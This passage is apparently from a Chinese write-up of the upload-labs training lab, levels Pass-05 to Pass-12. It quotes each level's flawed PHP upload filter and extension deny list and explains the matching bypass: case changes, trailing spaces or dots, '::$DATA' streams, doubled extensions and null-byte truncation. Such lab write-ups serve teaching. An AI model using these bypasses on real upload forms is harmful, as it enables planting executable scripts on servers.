<span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>
<span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>
<span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//首尾去空</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>代码先是去除文件名前后的空格，再去除文件名最后所有的<code>.</code>，再通过strrchar函数来寻找<code>.</code>来确认文件名的后缀，但是最后保存文件的时候没有重命名而使用的原始的文件名，导致可以利用 <code>1.php. .</code>（点+空格+点）来绕过</p>
<img src="/2021/07/03/upload-labs-tong-guan-ji-lu/160830.png" class title="image">
<h1 id="Pass-06-大小写绕过"><a href="#Pass-06-大小写绕过" class="headerlink" title="Pass-06 大小写绕过"></a>Pass-06 大小写绕过</h1><p>源码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aScx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aShx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cEr"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".sWf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".swf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htaccess"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ini"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>
<span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>
<span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//首尾去空</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>后缀转换为小写去掉了，因此可以使用大小绕过</p>
<img src="/2021/07/03/upload-labs-tong-guan-ji-lu/161539.png" class title="image">
<h1 id="Pass-07-空格绕过"><a href="#Pass-07-空格绕过" class="headerlink" title="Pass-07 空格绕过"></a>Pass-07 空格绕过</h1><p>源码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aScx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aShx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cEr"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".sWf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".swf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htaccess"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ini"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>
<span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>
<span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>没有对后缀名进行去空，没有对后缀名进行去空</p>
<img src="/2021/07/03/upload-labs-tong-guan-ji-lu/163301.png" class title="image">
<h1 id="Pass-08-点绕过"><a href="#Pass-08-点绕过" class="headerlink" title="Pass-08 点绕过"></a>Pass-08 点绕过</h1><p>源码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aScx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aShx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cEr"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".sWf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".swf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htaccess"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ini"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>
<span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>
<span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//首尾去空</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>没有对后缀名末尾的点进行处理，利用windows特性，会自动去掉后缀名中最后的 <code>.</code>，可在后缀名中加 <code>.</code> 绕过</p>
<img src="/2021/07/03/upload-labs-tong-guan-ji-lu/163841.png" class title="image">
<h1 id="Pass-09-DATA绕过"><a href="#Pass-09-DATA绕过" class="headerlink" title="Pass-09 ::$DATA绕过"></a>Pass-09 ::$DATA绕过</h1><p>源码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aScx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aShx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cEr"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".sWf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".swf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htaccess"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ini"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>
<span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>
<span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//首尾去空</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>没有对后缀名中的 <code>::$DATA</code> 进行过滤。在php+windows的情况下：如果文件名+<code>::$DATA</code> 会把 <code>::$DATA</code> 之后的数据当成文件流处理,不会检测后缀名.且保持 <code>::$DATA</code> 之前的文件名。</p>
<img src="/2021/07/03/upload-labs-tong-guan-ji-lu/164327.png" class title="image">
<h1 id="Pass-10-空格-绕过"><a href="#Pass-10-空格-绕过" class="headerlink" title="Pass-10 . + 空格 + . 绕过"></a>Pass-10 <code>.</code> + 空格 + <code>.</code> 绕过</h1><p>好像和Pass-05重复了</p>
<h1 id="Pass-11-双写绕过"><a href="#Pass-11-双写绕过" class="headerlink" title="Pass-11 双写绕过"></a>Pass-11 双写绕过</h1><p>源码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"swf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"htaccess"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ini"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token variable">$deny_ext</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>将黑名单里的后缀名替换为空且只替换一次，因此可以用双写绕过</p>
<img src="/2021/07/03/upload-labs-tong-guan-ji-lu/165116.png" class title="image">
<h1 id="Pass-12-00截断"><a href="#Pass-12-00截断" class="headerlink" title="Pass-12 00截断"></a>Pass-12 00截断</h1><p>源码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$ext_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'png'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
